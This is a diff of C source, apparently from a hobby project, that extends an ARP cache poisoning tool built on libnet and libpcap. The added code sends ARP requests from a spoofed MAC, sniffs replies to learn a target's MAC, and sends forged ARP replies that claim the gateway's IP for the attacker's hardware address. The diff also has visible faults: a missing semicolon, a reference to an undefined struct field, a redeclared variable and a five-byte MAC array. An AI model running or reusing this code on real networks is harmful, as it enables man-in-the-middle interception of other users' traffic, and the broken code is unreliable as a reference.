@@ -14,21 +14,51 @@ u_char enet_dst[6] = {0xf0, 0x27, 0x65, 0xff, 0xde, 0x43};
 struct{
     char* dev;
     libnet_t *arpMachine; 
+    uint8_t* hostHwAddr;
+    uint8_t* hostSpoofedHwAddr;
+    uint32_t hostIp;
 }Settings;
+/* Ethernet header */
+#define ETHER_H_SIZE 14
+struct ethernet_h {
+    u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
+    u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
+    u_short ether_type; /* IP? ARP? RARP? etc */
+};
 
-void sendArp(int type, char* ipsrc, uint8_t* hwsrc, char* ipdst, uint8_t* hwdst);
-int getMacAddress(char* ip){
+#define ARP_H_SIZE 28
+struct arp_h{
+    uint16_t hw_t;      // 0 : 2
+    uint16_t proto_t;   // 2 : 2
+    uint8_t hwaddrlen;  // 4 : 1
+    uint8_t protoaddrlen; // 5 : 1
+    uint16_t op;            // 6 : 2
+    uint8_t hwsrcaddr[6];  // 8 : 6
+    uint32_t netsrc;       // 14 : 4
+    uint8_t hwdstaddr[6];  // 18 : 6
+    uint32_t netdst;       // 24 : 4
+};
+
+void sendArp(int type, uint32_t ipsrc, uint8_t* hwsrc, uint32_t ipdst, uint8_t* hwdst);
+
+int hwAddrAreEqual(uint8_t* hw1, uint8_t* hw2){
+    for(int i=0; i<6; i++)
+        if (hw1[i] != hw2[i])
+            return 0;
+    return 1;
+}
+
+int getMacAddress(char* ip, uint8_t* hwbuf){
     char errbuf[PCAP_ERRBUF_SIZE];
     struct bpf_program fp;      /* The compiled filter */
     char filter[50];
-    sprintf(filter, "src ip %s", ip);
+    sprintf(filter, "arp");//, ip);
     char* filter_exp = filter;  /* The filter expression */
     bpf_u_int32 mask;       /* Our netmask */
     bpf_u_int32 net;        /* Our IP */
     struct pcap_pkthdr header;  /* The header that pcap gives us */
     const u_char *packet;       /* The actual packet */
-    char* dev = NULL;
-    dev = pcap_lookupdev(errbuf);
+    char* dev = Settings.dev;
     if (dev == NULL) {
         fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
         return(2);
@@ -59,10 +89,30 @@ int getMacAddress(char* ip){
         fprintf(stderr, "Device %s doesn't provide Ethernet headers - not supported\n", dev);
         return(2);
     }
-    /* Grab a packet */
-    packet = pcap_next(handle, &header);
-    /* Print its length */
-    printf("Jacked a packet with length of [%d]\n", header.len);
+    uint8_t hwz[] = {0x0,0x0,0x0,0x0,0x0,0x0};
+    struct in_addr targetaddr;
+    inet_aton(ip, &targetaddr);
+    sendArp(ARPOP_REQUEST, Settings.hostIp, Settings.hostSpoofedHwAddr, targetaddr.s_addr, hwz);
+    struct arp_h* arpReply;
+    // TODO change this to just match the target ip address..
+    do{
+        packet = pcap_next(handle, &header);
+        if (header.len < (ARP_H_SIZE+ETHER_H_SIZE))
+            continue;
+        arpReply = (struct arp_h*)(packet + ETHER_H_SIZE);
+    }while(!hwAddrAreEqual(arpReply->hwsrcaddr, Settings.hostSpoofedAddr))
+    
+    if (header.len < (ARP_H_SIZE+ETHER_H_SIZE)){
+        printf("received invalid packet of length %d/%d.\n", header.len, ARP_H_SIZE+ETHER_H_SIZE);
+        return 1;
+    }
+    struct arp_h* arpReply = (struct arp_h*)(packet + ETHER_H_SIZE);
+    printf("recieved MAC: ");
+    for(int i=0; i<6; i++){
+        printf("%x:", (hwbuf[i]=arpReply->hwsrcaddr[i]));
+
+    }
+    printf("\n");
     /* And close the session */
     pcap_close(handle);
     return 0;
@@ -70,24 +120,26 @@ int getMacAddress(char* ip){
 
 int arpPoison(char* ipTarget, char* ipGateway){
     // Lookup ipTarget's HWAddr..
+    if ( getMacAddress(ipTarget, enet_dst) != 0)
+        return 1;
+    uint8_t* hwspoof = Settings.hostHwAddr;
+    struct in_addr addr_src;
+    struct in_addr addr_dst;
+    inet_aton(ipGateway, &addr_src);
+    inet_aton(ipTarget, &addr_dst);
 
-    uint8_t* hwspoof = libnet_get_hwaddr(Settings.arpMachine)->ether_addr_octet;
-    // TODO replace enet_dst with lookup value
-    sendArp(ARPOP_REPLY, ipGateway, hwspoof, ipTarget, enet_dst);
+   // TODO replace enet_dst with lookup value
+    sendArp(ARPOP_REPLY, addr_src.s_addr, hwspoof, addr_dst.s_addr, enet_dst);
     return 0;
 }
 
 char ERRBUF[LIBNET_ERRBUF_SIZE];
-void sendArp(int type, char* ipsrc, uint8_t* hwsrc, char* ipdst, uint8_t* hwdst){
+void sendArp(int type, uint32_t ipsrc, uint8_t* hwsrc, uint32_t ipdst, uint8_t* hwdst){
     libnet_ptag_t t;
     libnet_t* l = Settings.arpMachine;
     int c;
     uint8_t *packet;
     uint32_t packet_s;
-    struct in_addr addr_src;
-    struct in_addr addr_dst;
-    inet_aton(ipsrc, &addr_src);
-    inet_aton(ipdst, &addr_dst);
 
     t = libnet_build_arp(
             ARPHRD_ETHER,   /* hardware addr */
@@ -96,9 +148,9 @@ void sendArp(int type, char* ipsrc, uint8_t* hwsrc, char* ipdst, uint8_t* hwdst)
             4,              /* protocol addr size */
             type,    /* operation type */
             hwsrc,   /* sender hardware addr */
-            (uint8_t *)&addr_src.s_addr,  /* sender protocol addr */
+            (uint8_t *)&ipsrc,  /* sender protocol addr */
             hwdst,   /* target hardware addr */
-            (uint8_t *)&addr_dst.s_addr,  /* target protocol addr */
+            (uint8_t *)&ipdst,  /* target protocol addr */
             NULL,           /* payload */
             0,              /* payload size */
             l,              /* libnet context */
@@ -151,8 +203,12 @@ int main(int argc, char* argv[]){
     Settings.dev = argv[1];
     Settings.arpMachine = libnet_init(
                                 LIBNET_LINK_ADV, /* injection type */
-                                Settings.dev,          /* network interface */
+                                Settings.dev,    /* network interface */
                                 ERRBUF);         /* errbuf */
+    Settings.hostHwAddr = libnet_get_hwaddr(Settings.arpMachine)->ether_addr_octet;
+    Settings.hostIp = libnet_get_ipaddr4(Settings.arpMachine);
+    uint8_t hwspoof[] = {0xca,0xfe,0xba,0xaa,0xbe};
+    Settings.hostSpoofedHwAddr = hwspoof;
    if (Settings.arpMachine == NULL){
         fprintf(stderr, "fail:%s\n", ERRBUF);
         exit(EXIT_FAILURE);
